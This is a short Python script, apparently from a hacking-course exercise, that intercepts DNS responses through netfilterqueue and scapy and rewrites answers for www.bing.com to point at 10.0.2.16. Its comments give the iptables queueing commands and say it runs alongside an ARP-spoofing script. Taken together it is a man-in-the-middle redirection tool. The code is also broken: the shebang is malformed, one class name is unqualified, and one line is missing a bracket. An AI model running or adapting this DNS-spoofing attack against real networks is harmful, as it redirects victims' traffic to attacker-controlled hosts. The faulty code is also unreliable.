#!/usr/binenv python

#pip install netfilterqueue

# work with packet sniffer
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables --flush

# python arp_spoof.py
# iptables -I FORWARD -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
            scapy_packet[DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum  
            del scapy_packet[scapy.UDP.len

            packet.set_payload(str(scapy_packet))

        # print(scapy_packet.show())
    # packet.drop()  
    packet.accept()

# ping -c 1 www.bing.com
# get IP address of a website


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


